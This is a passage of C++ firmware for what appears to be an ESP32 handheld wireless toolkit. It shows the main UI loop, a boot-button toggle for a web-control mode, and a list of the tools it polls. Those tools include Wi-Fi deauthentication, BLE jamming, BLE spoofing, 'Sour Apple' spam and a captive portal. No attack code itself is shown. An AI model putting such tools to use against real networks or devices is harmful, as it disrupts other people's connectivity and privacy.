      drawStubScreen("Unknown", "Go back");
      break;
  }
  _dirty = false;
}

void UI::loop() {
  // ---- BOOT button (GPIO0) hold 2s toggles Soft-AP web mode ----
  bool bootDown = (digitalRead(BOOT_BTN) == LOW);
  if (bootDown) {
    if (!bootWasDown) {
      bootWasDown = true;
      bootHoldStart = millis();
    } else if (bootHoldStart && (millis() - bootHoldStart >= 2000)) {
      bootHoldStart = 0;  // fire once per hold
      if (webMode) {
        exitWebMode();
        _screen = SCR_MAIN;
        _sel = 0; _top = 0; _dirty = true;
        drawCurrent();
      } else {
        enterWebMode();
      }
    }
  } else {
    bootWasDown = false;
    bootHoldStart = 0;
  }

  if (webMode) {
    // Keep tool updates alive so web-started tools work
    wifiScanUpdate();
    bleScanUpdate();
    pmUpdate();
    beaconUpdate();
    detUpdate();
    deauthUpdate();
    probeUpdate();
    sniffUpdate();
    spoofUpdate();
    sourUpdate();
    jamUpdate();
    airTagUpdate();
    handleWebClients();
    // If exit was requested from web UI
    if (!webMode) {
      _screen = SCR_MAIN;
      _sel = 0; _top = 0; _dirty = true;
      drawCurrent();
    }
    return;  // skip joystick UI while web mode is active
  }

  joystick.update();
  wifiScanUpdate();
  bleScanUpdate();
  pmUpdate();
  beaconUpdate();
  detUpdate();
  deauthUpdate();
  probeUpdate();
  captiveUpdate();
  sniffUpdate();
  spoofUpdate();
  sourUpdate();
  jamUpdate();
  airTagUpdate();

  static bool wasWifi = false, wasBle = false;
  if (wasWifi && !wifiScanning && _screen == SCR_WIFI_SCAN) _dirty = true;
  if (wasBle  && !bleScanning  && _screen == SCR_BLE_SCAN)  _dirty = true;
  wasWifi = wifiScanning;
  wasBle  = bleScanning;

  static uint32_t lastLive = 0;
  if ((_screen == SCR_PACKET_MON || _screen == SCR_BEACON ||
       _screen == SCR_DEAUTH_DET || _screen == SCR_DEAUTH ||
       _screen == SCR_PROBE || _screen == SCR_CAPTIVE ||
       _screen == SCR_BLE_SNIFF || _screen == SCR_BLE_SPOOF ||
       _screen == SCR_SOUR_APPLE || _screen == SCR_BLE_JAM ||
       _screen == SCR_AIRTAG) &&
      (millis() - lastLive > 250)) {
    lastLive = millis();
    _dirty = true;
  }

  JoyAction a = joystick.getAction();
  if (a != JOY_NONE) handleInput(a);
  if (_dirty) drawCurrent();
}
